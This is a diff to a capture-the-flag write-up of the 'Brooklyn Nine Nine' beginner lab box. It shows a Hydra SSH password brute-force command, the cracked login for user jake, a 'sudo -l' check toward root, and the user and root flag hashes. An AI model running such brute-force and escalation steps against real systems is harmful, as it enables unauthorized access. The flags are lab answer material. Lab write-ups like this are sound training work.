@@ -1,5 +1,7 @@
 **Tristan Gomez**
 
+
+# Brooklyn Nine Nine
 ```
 This room is aimed for beginner level hackers but anyone can try to hack this box. 
 There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.
@@ -44,9 +46,11 @@ Jake please change your password. It is too weak and holt will be mad if someone
 
 ```
 
-`hydra -l jake -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt ssh://10.10.97`
+`hydra -l jake -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt ssh://10.10.97.0`
 `[22][ssh] host: 10.10.97.0   login: jake   password: 987654321`
 
+
+go to /holt
 ```
 jake@brookly_nine_nine:/home/holt$ ls
 nano.save  user.txt
@@ -55,6 +59,8 @@ ee11cbb19052e40b07aac0ca060c23ee
 
 ```
 
+
+sudo -l to check permissions
 ```
 Matching Defaults entries for jake on brookly_nine_nine:
     env_reset, mail_badpass,
@@ -81,7 +87,7 @@ root
 ```
 
 ```
-# cat root.txt
+# cat /root/root.txt
 -- Creator : Fsociety2006 --
 Congratulations in rooting Brooklyn Nine Nine
 Here is the flag: 63a9f0ea7bb98050796b649e85481845
